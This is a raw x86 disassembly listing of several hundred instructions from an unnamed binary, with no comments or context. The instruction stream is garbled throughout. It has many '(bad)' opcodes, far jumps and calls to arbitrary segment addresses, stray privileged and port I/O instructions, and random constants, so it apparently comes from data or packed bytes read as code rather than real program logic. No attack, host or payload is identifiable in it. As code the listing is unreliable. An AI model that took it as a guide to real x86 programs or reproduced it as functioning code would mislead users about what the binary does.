  41d9ea:	jmp    0x4066:0xa8e03a64
  41d9f1:	fcomi  st,st(4)
  41d9f3:	inc    ecx
  41d9f4:	add    DWORD PTR [edi-0x54],ebx
  41d9f7:	mov    ebx,0x354e4e0c
  41d9fc:	xchg   esi,eax
  41d9fd:	push   edi
  41d9fe:	leave  
  41d9ff:	jae    0x41d9f8
  41da01:	pop    esi
  41da02:	dec    esp
  41da03:	sub    esp,DWORD PTR [eax+ebx*2-0x35021d9d]
  41da0a:	rol    BYTE PTR [esi+edx*1],cl
  41da0d:	adc    ebp,DWORD PTR [esi-0x36e70972]
  41da13:	pop    edi
  41da14:	push   ebx
  41da15:	test   eax,0x49bd313e
  41da1a:	pop    edi
  41da1b:	call   0x568e:0x3adbb314
  41da22:	imul   esi,DWORD PTR [edi+0x24],0xd41e53d3
  41da29:	jnp    0x41d9d4
  41da2b:	sbb    edx,DWORD PTR [eax]
  41da2d:	hlt    
  41da2e:	div    DWORD PTR [ebp-0x16]
  41da31:	fiadd  WORD PTR [edx+0x3cfb74e2]
  41da37:	jne    0x41da14
  41da39:	(bad)  
  41da3a:	aaa    
  41da3b:	or     eax,0x2c82912e
  41da40:	nop
  41da41:	jne    0x41dab1
  41da43:	sbb    al,0xbb
  41da45:	cmp    bh,0x82
  41da48:	sbb    eax,0xbf74a48f
  41da4d:	xchg   ecx,eax
  41da4e:	cli    
  41da4f:	sbb    ah,BYTE PTR [ecx-0x7687213a]
  41da55:	sub    eax,DWORD PTR [edi]
  41da57:	mov    ecx,0xf5e716cf
  41da5c:	mov    DWORD PTR [ecx-0x5c],edi
  41da5f:	sub    al,al
  41da61:	(bad)  
  41da63:	(bad)  
  41da64:	fldenv [ecx+ebx*8-0x42ffcd39]
  41da6b:	mov    ebx,0xfa6be615
  41da70:	mov    ecx,0x8badcd1d
  41da75:	cwde   
  41da76:	and    eax,0xeb2ad5e2
  41da7b:	jb     0x41dad2
  41da7d:	arpl   WORD PTR [edx],ax
  41da7f:	adc    al,0xbd
  41da81:	(bad)  
  41da82:	aam    0xf2
  41da84:	inc    eax
  41da85:	sbb    DWORD PTR [edx+0x141b44b6],edi
  41da8b:	sub    DWORD PTR [eax+0x32e978d0],0xa99517a4
  41da95:	pop    edx
  41da96:	xor    al,0x61
  41da98:	dec    eax
  41da99:	lea    esi,[ecx-0x566f99c]
  41da9f:	add    esi,edi
  41daa1:	mov    ecx,0x4d043980
  41daa6:	jle    0x41db05
  41daa8:	(bad)  
  41daa9:	pop    eax
  41daaa:	jno    0x41daed
  41daac:	int3   
  41daad:	dec    esp
  41daae:	fwait
  41daaf:	push   edx
  41dab0:	mov    ds:0x8921f0be,al
  41dab5:	call   FWORD PTR [edx-0x5b23f008]
  41dabb:	add    ecx,DWORD PTR [ecx-0x349d0795]
  41dac1:	xor    dh,bh
  41dac3:	sar    DWORD PTR [eax-0x2c],0x68
  41dac7:	push   esi
  41dac8:	jmp    0x41db2d
  41daca:	sub    DWORD PTR [edi-0x2d],edi
  41dacd:	sbb    edx,edi
  41dacf:	scas   eax,DWORD PTR es:[edi]
  41dad0:	inc    esi
  41dad1:	fidiv  DWORD PTR [esi+eax*2]
  41dad4:	lea    eax,cs:[ecx+esi*4-0x3]
  41dad9:	or     ebx,DWORD PTR [ebx]
  41dadb:	mov    al,ds:0xad5e75c9
  41dae0:	fistp  DWORD PTR [ebx]
  41dae2:	and    ch,BYTE PTR [esi]
  41dae4:	in     eax,0xe3
  41dae6:	loope  0x41daad
  41dae8:	fild   DWORD PTR [esi+0x64f2c4b]
  41daee:	enter  0xfc9,0x2
  41daf2:	sbb    esp,esi
  41daf4:	arpl   WORD PTR [edi-0x2b7c1376],ax
  41dafa:	xor    cl,ch
  41dafc:	das    
  41dafd:	mov    ebx,0x9695da76
  41db02:	ja     0x41db2c
  41db04:	mov    ss,WORD PTR [edx]
  41db06:	push   edx
  41db07:	ja     0x41db5b
  41db09:	lods   eax,DWORD PTR ds:[esi]
  41db0a:	adc    eax,0x78057e05
  41db0f:	xlat   BYTE PTR ds:[ebx]
  41db10:	out    dx,eax
  41db11:	popf   
  41db12:	mov    ah,0x83
  41db14:	jge    0x41db33
  41db16:	(bad)  
  41db17:	jecxz  0x41db76
  41db19:	jno    0x41db3a
  41db1b:	call   0x63de:0x4681da1a
  41db22:	inc    eax
  41db23:	outs   dx,BYTE PTR ds:[esi]
  41db24:	adc    ch,BYTE PTR [ebx]
  41db26:	fst    st(7)
  41db28:	js     0x41daef
  41db2a:	fsub   st,st(7)
  41db2c:	cli    
  41db2d:	pop    ds
  41db2e:	xlat   BYTE PTR ds:[ebx]
  41db2f:	call   0x7bc054c7
  41db34:	xor    dl,BYTE PTR [esi-0x631dbfbf]
  41db3a:	push   cs
  41db3b:	mov    ecx,0x4be2d527
  41db40:	pop    ecx
  41db41:	scas   eax,DWORD PTR es:[edi]
  41db42:	inc    edi
  41db43:	test   eax,0xab8b490a
  41db48:	fnstcw WORD PTR [edx]
  41db4a:	jbe    0x41db27
  41db4c:	dec    ecx
  41db4d:	mov    cl,0x5f
  41db4f:	sti    
  41db50:	in     al,0xb8
  41db52:	jecxz  0x41db1e
  41db54:	sbb    eax,esp
  41db56:	test   al,0x6c
  41db58:	fsub   st(2),st
  41db5a:	jnp    0x41db3b
  41db5c:	es test cl,0xdc
  41db60:	sub    BYTE PTR [edx+0x4e993dce],ch
  41db66:	test   al,0x39
  41db68:	cmp    ah,0xca
  41db6b:	dec    edx
  41db6c:	push   ds
  41db6d:	imul   esp,DWORD PTR [esi],0x60
  41db70:	mov    esp,0x4b4e84f8
  41db75:	(bad)
  41db78:	cli    
  41db79:	dec    edi
  41db7a:	xlat   BYTE PTR ds:[ebx]
  41db7b:	test   BYTE PTR [ecx-0x33],bl
  41db7e:	sub    DWORD PTR [eax-0x4a],edi
  41db81:	push   ds
  41db82:	mov    edx,0x2db86bde
  41db87:	nop
  41db88:	fisubr WORD PTR gs:[esi+0x6a]
  41db8c:	inc    esi
  41db8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db8e:	push   0x17
  41db90:	out    dx,eax
  41db91:	ss scas al,BYTE PTR es:[edi]
  41db93:	call   0x16f2a3b0
  41db98:	outs   dx,DWORD PTR ds:[esi]
  41db99:	pop    ebp
  41db9a:	sbb    dh,dl
  41db9c:	xchg   esp,eax
  41db9d:	ret    0xb3ad
  41dba0:	das    
  41dba1:	mov    bl,0x90
  41dba3:	inc    esp
  41dba4:	xor    eax,0xcef9eb13
  41dba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbaa:	icebp  
  41dbab:	cmp    ecx,DWORD PTR [eax]
  41dbad:	and    al,0xbb
  41dbaf:	mov    cl,0x5e
  41dbb1:	in     al,dx
  41dbb2:	and    BYTE PTR [edx+0x32],dh
  41dbb5:	arpl   WORD PTR [esi],cx
  41dbb7:	jmp    eax
  41dbb9:	pop    ebx
  41dbba:	xlat   BYTE PTR ds:[ebx]
  41dbbb:	jecxz  0x41db59
  41dbbd:	xchg   ebp,eax
  41dbbe:	xchg   esi,eax
  41dbbf:	daa    
  41dbc0:	lock popaw 
  41dbc3:	out    dx,al
  41dbc4:	pop    esp
  41dbc5:	sti    
  41dbc6:	pop    esi
  41dbc7:	lods   al,BYTE PTR ds:[esi]
  41dbc8:	je     0x41dc25
  41dbca:	cmc    
  41dbcb:	xor    BYTE PTR [edx-0x26314ebb],dh
  41dbd1:	ret    
  41dbd2:	sti    
  41dbd3:	sub    ecx,DWORD PTR [edx+eiz*1]
  41dbd6:	mov    ds:0xcd3748f3,eax
  41dbdb:	or     DWORD PTR [esi],0xf
  41dbde:	xchg   DWORD PTR [ebx+0xad61055],esi
  41dbe4:	mov    fs,WORD PTR [esi+0x75ca83ce]
  41dbea:	pop    ecx
  41dbeb:	adc    ebp,eax
  41dbed:	xor    esp,ebp
  41dbef:	mov    al,ds:0x9ae3839b
  41dbf4:	push   ebx
  41dbf5:	mov    bl,0x35
  41dbf7:	ret    
  41dbf8:	mov    ah,0x5b
  41dbfa:	jno    0x41dc3e
  41dbfc:	xor    al,0x54
  41dbfe:	inc    edi
  41dbff:	mov    ah,0xdc
  41dc01:	inc    ebx
  41dc02:	dec    esi
  41dc03:	sbb    ecx,DWORD PTR [edi+0x406a41c0]
  41dc09:	add    al,0x14
  41dc0b:	retf   
  41dc0c:	and    cl,BYTE PTR [eax]
  41dc0e:	loop   0x41dc55
  41dc10:	mov    edx,0xf47a79c6
  41dc15:	frstor [edx]
  41dc17:	jg     0x41dbf0
  41dc19:	or     BYTE PTR [eax],0x2b
  41dc1c:	jae    0x41dc43
  41dc1e:	aas    
  41dc1f:	jge    0x41dc64
  41dc21:	cld    
  41dc22:	(bad)  
  41dc23:	scas   eax,DWORD PTR es:[edi]
  41dc24:	sar    DWORD PTR [edx+0x52ed65cf],0xa0
  41dc2b:	pop    ds
  41dc2c:	dec    esi
  41dc2d:	jo     0x41dc8a
  41dc2f:	popf   
  41dc30:	jecxz  0x41dc1e
  41dc32:	scas   eax,DWORD PTR es:[edi]
  41dc33:	add    BYTE PTR [ecx],bl
  41dc35:	mov    dh,ch
  41dc37:	fs push edi
  41dc39:	test   eax,0x3e5a7ce8
  41dc3e:	add    esp,DWORD PTR [edx]
  41dc40:	pop    edi
  41dc41:	and    al,0xa7
  41dc43:	dec    edx
  41dc44:	sbb    al,0xae
  41dc46:	lea    edi,[edi-0x65]
  41dc49:	(bad)  
  41dc4a:	rcr    DWORD PTR [ecx+0x260cf342],1
  41dc50:	inc    ecx
  41dc51:	xchg   ebp,eax
  41dc52:	(bad)  
  41dc53:	enter  0x44a5,0x60
  41dc57:	lods   al,BYTE PTR ds:[esi]
  41dc58:	mov    ebp,0x66a7a414
  41dc5d:	adc    eax,0x39247467
  41dc62:	push   ebx
  41dc63:	fist   DWORD PTR [ecx]
  41dc65:	out    dx,eax
  41dc66:	cmp    BYTE PTR [ebp-0x6c],ah
  41dc69:	mov    WORD PTR [edi],?
  41dc6b:	cmp    edx,DWORD PTR [ecx+0xb]
  41dc6e:	xchg   edi,eax
  41dc6f:	dec    ebx
  41dc70:	fimul  DWORD PTR [edi+0x1e]
  41dc73:	pop    es
  41dc74:	ret    
  41dc75:	in     al,0xfe
  41dc77:	jmp    0x8b75:0xf0a3c6a8
  41dc7e:	loope  0x41dc91
  41dc80:	lahf   
  41dc81:	xchg   edx,ecx
  41dc83:	inc    esi
  41dc84:	fild   WORD PTR [esi]
  41dc86:	pusha  
  41dc87:	jno    0x41dc78
  41dc89:	loopne 0x41dc1c
  41dc8b:	xchg   ecx,eax
  41dc8c:	ds mov edx,0x345a2ed7
  41dc92:	sbb    bl,BYTE PTR [eax]
  41dc94:	jp     0x41dc97
  41dc96:	add    eax,0x81706e9e
  41dc9b:	rcr    BYTE PTR [esi-0x79bbb91e],0x98
  41dca2:	lds    eax,FWORD PTR [edi]
  41dca4:	and    BYTE PTR [edx+esi*2],ah
  41dca7:	rep lods eax,DWORD PTR ds:[esi]
  41dca9:	pop    esi
  41dcaa:	or     eax,DWORD PTR [ebx-0x11]
  41dcad:	sub    DWORD PTR [esi*1+0x7e16d145],esp
  41dcb4:	push   ds
  41dcb5:	mov    ds:0x6f9ede91,al
  41dcba:	test   BYTE PTR [esp+ebp*4-0x49d727df],cl
  41dcc1:	add    eax,edx
  41dcc3:	stos   DWORD PTR es:[edi],eax
  41dcc4:	mov    edx,0x8a9fc4a3
  41dcc9:	and    eax,0xd1090f20
  41dcce:	jno    0x41dc73
  41dcd0:	jle    0x41dcb5
  41dcd2:	cmp    cl,cl
  41dcd4:	scas   al,BYTE PTR es:[edi]
  41dcd5:	xlat   BYTE PTR ds:[ebx]
  41dcd6:	jmp    FWORD PTR [ebx]
  41dcd8:	add    esi,DWORD PTR [edx+0x66]
  41dcdb:	(bad)  
  41dcdc:	xchg   edx,eax
  41dcdd:	add    bl,BYTE PTR [ecx-0x7b]
  41dce0:	xor    al,0xf0
  41dce2:	sub    eax,0xf1eb5b68
  41dce7:	mov    dh,0xea
  41dce9:	or     ebx,DWORD PTR [ebp+eax*4+0x5b]
  41dced:	cs popa 
  41dcef:	fnstcw WORD PTR [eax+0x48]
  41dcf2:	lahf   
  41dcf3:	mov    ah,BYTE PTR [eax+0x15527bdc]
  41dcf9:	jo     0x41dc90
  41dcfb:	cmp    eax,0x55eae267
  41dd00:	dec    ebp
  41dd01:	push   ebp
  41dd02:	jb     0x41dcf8
  41dd04:	std    
  41dd05:	jle    0x41dd1d
  41dd07:	or     BYTE PTR [eax+0x6aacb0d0],0xd0
  41dd0e:	mov    edi,es
  41dd10:	jno    0x41dd22
  41dd12:	lds    edi,FWORD PTR [ebx+ebp*4]
  41dd15:	mov    eax,0x6d63e471
  41dd1a:	ja     0x41dcfa
  41dd1c:	je     0x41dd9b
  41dd1e:	(bad)  
  41dd20:	fs push ebx
  41dd22:	mov    edx,0xebe3c2b
  41dd27:	push   eax
  41dd28:	sbb    al,0xea
  41dd2a:	ret    
  41dd2b:	mov    ds,WORD PTR [eax-0x78]
  41dd2e:	adc    ax,0x1ec4
  41dd32:	dec    ebx
  41dd33:	push   ecx
  41dd34:	cdq    
  41dd35:	leave  
  41dd36:	push   0x17f87c14
  41dd3b:	shl    bl,0x9f
  41dd3e:	loop   0x41dd85
  41dd40:	aad    0xa1
  41dd42:	test   DWORD PTR [edi+ecx*2],ebp
  41dd45:	inc    esp
  41dd46:	fwait
  41dd47:	and    al,0x9c
  41dd49:	xchg   edx,eax
  41dd4a:	and    al,0x3c
  41dd4c:	shr    ebp,cl
  41dd4e:	inc    BYTE PTR [esi-0x11405270]
  41dd54:	and    ah,ch
  41dd56:	xchg   BYTE PTR [ebp-0x67],dh
  41dd59:	loope  0x41ddc1
  41dd5b:	jecxz  0x41dd37
  41dd5d:	xor    eax,0x9139142c
  41dd62:	inc    ebx
  41dd63:	xchg   esp,eax
  41dd64:	xchg   edi,eax
  41dd65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd66:	jae    0x41ddd8
  41dd68:	out    dx,al
  41dd69:	pop    ss
  41dd6a:	cmc    
  41dd6b:	push   edx
  41dd6c:	ins    BYTE PTR es:[edi],dx
  41dd6d:	adc    BYTE PTR [eax],bl
  41dd6f:	leave  
  41dd70:	repz pop edx
  41dd72:	and    al,0xa7
  41dd74:	hlt    
  41dd75:	add    eax,0xb0d3aad0
  41dd7a:	mov    ebp,0x5bb21a4a
  41dd7f:	push   ds
  41dd80:	xor    bl,ch
  41dd82:	mov    BYTE PTR [esi],ah
  41dd84:	pop    ds
  41dd85:	xor    DWORD PTR [esi-0x8],eax
  41dd88:	jne    0x41dd35
  41dd8a:	push   edx
  41dd8b:	mov    esi,edi
  41dd8d:	psadbw mm3,QWORD PTR [ebx+edx*2-0x31d6f67e]
  41dd95:	xchg   BYTE PTR [edx],bl
  41dd97:	pop    edi
  41dd98:	call   DWORD PTR [edx]
  41dd9a:	xchg   ebx,eax
  41dd9b:	xor    eax,0xe0707528
  41dda0:	jae    0x41ddaa
  41dda2:	mov    BYTE PTR [esi+0x1e],bl
  41dda5:	inc    ebx
  41dda6:	and    DWORD PTR [esi+ecx*8+0x28],0xffffffd4
  41ddab:	stos   DWORD PTR es:[edi],eax
  41ddac:	addr16 push es
  41ddae:	xchg   esp,eax
  41ddaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddb0:	xor    ebx,DWORD PTR [ebx+0x99390da]
  41ddb6:	jb     0x41de20
  41ddb8:	or     BYTE PTR [ebx],bl
  41ddba:	out    dx,al
  41ddbb:	xchg   esp,eax
  41ddbc:	or     BYTE PTR [ebx],cl
  41ddbe:	pop    esi
  41ddbf:	les    eax,FWORD PTR [ecx+esi*8-0x42]
  41ddc3:	sub    BYTE PTR [esp+ebp*8-0x70],0x66
  41ddc8:	ss xchg ecx,eax
  41ddca:	fsub   QWORD PTR [ebp+0x5d41ce67]
  41ddd0:	mov    dl,0x73
  41ddd2:	fwait
  41ddd3:	sub    eax,eax
  41ddd5:	and    al,ah
  41ddd7:	inc    ebx
  41ddd8:	cmp    bh,BYTE PTR [esp+eax*8-0x61]
  41dddc:	rcl    DWORD PTR [edx-0x2b],cl
  41dddf:	test   ecx,ebx
  41dde1:	enter  0x1bfe,0xa4
  41dde5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dde6:	push   ebp
  41dde7:	or     eax,0xf4bf6f1
  41ddec:	jne    0x41de62
  41ddee:	push   cs
  41ddef:	sbb    BYTE PTR [ebx+0x7fdf638a],al
  41ddf5:	(bad)  
  41ddf7:	sbb    al,0x4a
  41ddf9:	inc    eax
  41ddfa:	pop    ds
  41ddfb:	push   ss
  41ddfc:	jmp    0x20e:0x113b9bbe
  41de03:	fst    DWORD PTR [ebp-0x46]
  41de06:	add    BYTE PTR [ebp-0x1bbb3ede],0x5b
  41de0d:	dec    edi
  41de0e:	sbb    eax,0xd0a9cc5
  41de13:	pop    eax
  41de14:	push   0x4e
  41de16:	es ds (bad) 
  41de1a:	pop    ebp
  41de1b:	pop    edi
  41de1c:	in     al,dx
  41de1d:	mov    edx,0x6d1b379f
  41de22:	loopne 0x41ddd6
  41de24:	fcmovnu st,st(3)
  41de26:	jmp    0x22167178
  41de2b:	out    dx,eax
  41de2c:	or     DWORD PTR [ecx],0xb2fdfe1c
  41de32:	mov    eax,0xe0aaa66e
  41de37:	mov    bl,0xac
  41de3a:	xchg   ebp,eax
  41de3b:	pushf  
  41de3c:	push   ebx
  41de3d:	jb     0x41ddda
  41de3f:	es out dx,eax
  41de41:	sub    al,0x88
  41de43:	lock (bad) 
  41de46:	mov    esi,0x1c142aee
  41de4b:	jae    0x41ddfc
  41de4d:	sbb    bh,BYTE PTR ds:0x96526898
  41de53:	xchg   edx,eax
  41de54:	mov    eax,ds:0x78defd97
  41de59:	mov    cs,WORD PTR [eax]
  41de5b:	mov    eax,ds:0xc647edd0
  41de60:	add    esp,DWORD PTR [edx-0x38]
  41de63:	inc    ebx
  41de64:	fsubr  QWORD PTR [eax-0x18a71df6]
  41de6a:	add    eax,DWORD PTR ds:0x5e8b27d8
  41de70:	test   BYTE PTR [eax+0x7c2b073b],dh
  41de76:	jle    0x41ded2
  41de78:	pop    edx
  41de79:	ins    BYTE PTR es:[edi],dx
  41de7a:	icebp  
  41de7b:	xor    eax,0x4c401702
  41de80:	mov    esi,0x19f9918a
  41de85:	jno    0x41de46
  41de87:	dec    eax
  41de88:	push   0x8ba342c6
  41de8d:	stos   DWORD PTR es:[edi],eax
  41de8e:	div    ecx
  41de90:	fs mov ebx,0xd77da899
  41de96:	retf   0x95da
  41de99:	dec    esp
  41de9a:	push   eax
  41de9b:	and    cl,BYTE PTR [edi+0x311d005d]
  41dea1:	out    dx,eax
  41dea2:	add    BYTE PTR [ecx],dh
  41dea4:	mov    bl,dh
  41dea6:	push   eax
  41dea7:	sbb    BYTE PTR [eax+0x78],0x5b
  41deab:	mov    ecx,edi
  41dead:	neg    DWORD PTR [edi-0x49]
  41deb0:	add    al,0x73
  41deb2:	xchg   edi,eax
  41deb3:	mov    bl,0xb9
  41deb5:	sub    eax,0xce752fec
  41deba:	or     DWORD PTR [esi+0x61],ebx
  41debd:	in     eax,dx
  41debe:	inc    ebp
  41debf:	mov    edi,0x8823f171
  41dec4:	mov    ebx,0xed7ceb27
  41dec9:	dec    edx
  41deca:	adc    ecx,DWORD PTR [ebp+0xb15bf07]
  41ded0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ded1:	add    al,BYTE PTR [ecx]
  41ded3:	mov    ecx,DWORD PTR [ecx+0x64]
  41ded6:	mov    ah,0x68
  41ded8:	push   eax
  41ded9:	fild   WORD PTR [eax+0x6c]
  41dedc:	(bad)
  41dedf:	inc    edi
  41dee0:	popf   
  41dee1:	push   ebx
  41dee2:	xchg   edi,eax
  41dee3:	ret    
  41dee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee5:	pop    edi
  41dee6:	test   BYTE PTR [esp+ecx*1],bl
  41dee9:	(bad)
  41deec:	sub    dh,BYTE PTR [esi+ecx*1]
  41deef:	dec    ecx
  41def0:	dec    edi
  41def1:	jmp    0x41debe
  41def3:	mov    ?,WORD PTR [ecx+eax*1+0xa490103]
  41defa:	fistp  QWORD PTR [ecx-0x56]
  41defd:	out    0x28,eax
  41deff:	nop
  41df00:	sub    eax,0x5185a13f
  41df05:	sbb    ebp,DWORD PTR [edx+0x38]
  41df08:	int    0xcc
  41df0a:	jbe    0x41df2e
  41df0c:	mov    ebp,0xee9517c5
  41df11:	and    ecx,ebp
  41df13:	das    
  41df14:	lods   al,BYTE PTR ds:[esi]
  41df15:	mov    DWORD PTR [eax],ebp
  41df17:	fld    QWORD PTR [esi]
  41df19:	leave  
  41df1a:	push   ss
  41df1b:	ins    BYTE PTR es:[edi],dx
  41df1c:	mov    dh,0x26
  41df1e:	dec    ecx
  41df1f:	aas    
  41df20:	inc    ebp
  41df21:	cdq    
  41df22:	and    dl,BYTE PTR [ebp+0x557271ba]
  41df28:	mov    esi,0xda5a488a
  41df2d:	addr16 push ecx
  41df2f:	mov    esi,0x8504b425
  41df34:	je     0x41df26
  41df36:	jle    0x41df3a
  41df38:	andps  xmm5,xmm3
  41df3b:	sub    ebp,esi
  41df3d:	aaa    
  41df3e:	cmp    dl,0xb2
  41df41:	mov    ecx,DWORD PTR [esi+0x41]
  41df44:	dec    esp
  41df45:	loopne 0x41decb
  41df47:	xlat   BYTE PTR ds:[ebx]
  41df48:	mov    ecx,0xf6a2e082
  41df4d:	add    edi,DWORD PTR ds:0x3d933c08
  41df53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df54:	jg     0x41df16
  41df56:	cli    
  41df57:	call   0x543c2e07
  41df5c:	int3   
  41df5d:	pop    eax
  41df5e:	pop    eax
  41df5f:	cli    
  41df60:	stc    
  41df61:	push   esp
  41df62:	stc    
  41df63:	cdq    
  41df64:	sbb    eax,edx
  41df66:	add    DWORD PTR [edx],ebx
  41df68:	and    dh,0x75
  41df6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df6c:	xchg   DWORD PTR [ecx],ebp
  41df6e:	clc    
  41df6f:	xchg   ecx,eax
  41df70:	adc    ecx,DWORD PTR [edi]
  41df72:	cmp    DWORD PTR [ebp-0x20],edx
  41df75:	enter  0xa73b,0xae
  41df79:	call   0xf96af1c6
  41df7e:	push   es
  41df7f:	inc    ebx
  41df80:	xor    DWORD PTR [edi-0x51],0x88a635cb
  41df87:	ret    
  41df88:	fwait
  41df89:	aad    0xe7
  41df8b:	dec    ecx
  41df8c:	xor    eax,0x561e6694
  41df91:	jae    0x41e012
  41df93:	jne    0x41df2f
  41df95:	xchg   ebp,eax
  41df96:	ja     0x41df3c
  41df98:	sbb    eax,0xefbacb39
  41df9d:	lods   eax,DWORD PTR ds:[esi]
  41df9e:	push   0xffffffae
  41dfa0:	inc    edi
  41dfa1:	fbstp  TBYTE PTR [ecx-0x4831d15f]
  41dfa7:	(bad)  
  41dfa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfaa:	jae    0x41e024
  41dfac:	or     al,0xdc
  41dfae:	mov    ah,BYTE PTR ds:0xbdb60c7
  41dfb4:	aad    0x47
  41dfb6:	jmp    0x1567:0x1ab7d10f
  41dfbd:	mov    edi,ss
  41dfbf:	aad    0xa6
  41dfc1:	enter  0x2271,0xd5
  41dfc5:	jns    0x41dfc1
  41dfc7:	jb     0x41e015
  41dfc9:	push   ebp
  41dfca:	ja     0x41df51
  41dfcc:	ficom  WORD PTR [esi+ecx*8+0x7d]
  41dfd0:	ret    0x4b62
  41dfd3:	xchg   ebx,eax
  41dfd4:	ret    
  41dfd5:	aas    
  41dfd6:	push   ss
  41dfd7:	pop    es
  41dfd8:	jge    0x41e04a
  41dfda:	repz cdq 
  41dfdc:	add    dl,dh
  41dfde:	fucom  st(4)
  41dfe0:	dec    edi
  41dfe1:	mov    esi,0x30d538ff
  41dfe6:	sahf   
  41dfe7:	out    dx,al
  41dfe8:	xor    DWORD PTR [edx-0x5a790a],edx
  41dfee:	call   0x76f7:0x18f62cd9
  41dff5:	dec    ebx
  41dff6:	dec    eax
  41dff7:	xor    al,0x44
  41dff9:	in     al,dx
  41dffa:	adc    DWORD PTR [ebp-0x46],ebp
  41dffd:	ds fnclex 
  41e000:	ja     0x41e005
  41e002:	mov    WORD PTR [ebp-0xa],?
  41e005:	fmul   QWORD PTR [ebp+0x1b5ccb87]
  41e00b:	hlt    
  41e00c:	int    0xa
  41e00e:	pushf  
  41e00f:	stos   BYTE PTR es:[edi],al
  41e010:	adc    al,0xd0
  41e012:	pop    es
  41e013:	mov    esi,0x5002c732
  41e018:	mov    dl,0x6b
  41e01a:	dec    ebx
  41e01b:	inc    ecx
  41e01c:	cmp    eax,0x6bfb8d6e
  41e021:	or     DWORD PTR [eax-0x7cd13654],esp
  41e027:	iret   
  41e028:	add    ch,BYTE PTR [ecx-0x706469df]
  41e02e:	mov    BYTE PTR [ebx],bl
  41e030:	xchg   BYTE PTR [esi+0x10],cl
  41e033:	adc    al,0x5e
  41e035:	stos   BYTE PTR es:[edi],al
  41e036:	push   ds
  41e037:	push   ebp
  41e038:	bound  eax,QWORD PTR [esi+0x53]
  41e03b:	adc    esp,DWORD PTR [edi]
  41e03d:	call   0x6f1:0xaf983591
  41e044:	mov    ah,0xe6
  41e046:	mov    eax,0xf2113f0f
  41e04b:	std    
  41e04c:	or     ecx,DWORD PTR [ebx]
  41e04e:	sub    DWORD PTR [ebp-0x42696fd8],edi
  41e054:	inc    ecx
  41e055:	add    esi,DWORD PTR ds:0x7d669dcc
  41e05b:	iret   
  41e05c:	inc    edi
  41e05d:	lods   al,BYTE PTR ds:[esi]
  41e05e:	fs jmp 0x3db7026c
  41e064:	aad    0xdd
  41e066:	push   edx
  41e067:	mov    BYTE PTR [esi+0x61],al
  41e06a:	add    DWORD PTR [eax-0x7d39dc2e],ebx
  41e070:	xchg   ecx,eax
  41e071:	mov    ecx,0xdab9ee50
  41e076:	dec    ecx
  41e077:	add    dl,BYTE PTR [edx+0x18441263]
  41e07d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e07e:	outs   dx,DWORD PTR ds:[esi]
  41e07f:	js     0x41e025
  41e081:	nop
  41e082:	call   0x8553acd2
  41e087:	xchg   ebx,eax
  41e088:	je     0x41e0cf
  41e08a:	sbb    BYTE PTR [ebp+0x3e],ch
  41e08d:	pop    ss
  41e08e:	or     BYTE PTR [esi+edi*8-0x62],dh
  41e092:	ds push esi
  41e094:	scas   al,BYTE PTR es:[edi]
  41e095:	shl    DWORD PTR [edx-0x69edc070],1
  41e09b:	dec    edi
  41e09c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e09d:	or     cl,ah
  41e09f:	pop    esi
  41e0a0:	xchg   edx,eax
  41e0a1:	sub    BYTE PTR [ebx+0x4c],bl
  41e0a4:	dec    ebp
  41e0a5:	adc    edi,eax
  41e0a7:	xchg   esi,eax
  41e0a8:	sti    
  41e0a9:	test   bl,bh
  41e0ab:	sbb    eax,0x3a848672
  41e0b0:	adc    DWORD PTR [eax+0x49],esp
  41e0b3:	and    ecx,esi
  41e0b5:	(bad)  
  41e0b6:	push   0xffffffae
  41e0b8:	mov    ds:0x48c5d53c,eax
  41e0bd:	and    bl,dl
  41e0bf:	in     eax,dx
  41e0c0:	xor    DWORD PTR [edi+0x503b1170],ebx
  41e0c6:	push   ecx
  41e0c7:	mov    al,BYTE PTR [edx-0x157ae39e]
  41e0cd:	outs   dx,BYTE PTR ds:[esi]
  41e0ce:	mov    ds:0xa609c3b,eax
  41e0d3:	(bad)  
  41e0d4:	jmp    FWORD PTR [edx-0x18c208cc]
  41e0da:	pusha  
  41e0db:	or     eax,DWORD PTR [eax+eax*8+0x678e09ed]
  41e0e2:	add    al,0xc1
  41e0e4:	cmp    eax,0x79ce377b
  41e0e9:	loop   0x41e0d6
  41e0eb:	cdq    
  41e0ec:	imul   ebp,DWORD PTR [edx+0x7688c8ec],0xffffffa2
  41e0f3:	repz inc eax
  41e0f5:	hlt    
  41e0f6:	fbstp  TBYTE PTR [edx-0xd4664c9]
  41e0fc:	pusha  
  41e0fd:	jbe    0x41e141
  41e0ff:	enter  0x7146,0x91
  41e103:	fisub  WORD PTR [ebp+0x1d]
  41e106:	aam    0xfe
  41e108:	sub    al,0xb
  41e10a:	add    BYTE PTR [ebp-0x636b615c],ah
  41e110:	out    0xc4,al
  41e112:	mov    dl,0x2d
  41e114:	fs jg  0x41e0bc
  41e117:	mov    ?,WORD PTR [ebp-0x49adac10]
  41e11d:	in     eax,dx
  41e11e:	ficom  WORD PTR [ecx-0xfd233eb]
  41e124:	pop    eax
  41e125:	mov    dh,0x5a
  41e127:	and    ah,cl
  41e129:	pop    edx
  41e12a:	push   ecx
  41e12b:	cmp    eax,0x7b0a659a
  41e130:	or     eax,DWORD PTR [esi]
  41e132:	ins    BYTE PTR es:[edi],dx
  41e133:	adc    DWORD PTR [edx],0xffffff9f
  41e136:	dec    esp
  41e137:	loopne 0x41e1ac
  41e139:	or     BYTE PTR [edi],cl
  41e13b:	imul   eax,DWORD PTR [ecx+0x45eb9cda],0xd8bede9c
  41e145:	mov    eax,ds:0x83cf8723
  41e14a:	pop    ecx
  41e14b:	in     eax,0x91
  41e14d:	and    eax,0xb0584eb7
  41e152:	test   al,0xf5
  41e154:	jmp    0x7a98:0x769cca8c
  41e15b:	call   0xea604cd0
  41e160:	sub    al,0x9a
  41e162:	cld    
  41e163:	jns    0x41e0f3
  41e165:	push   edi
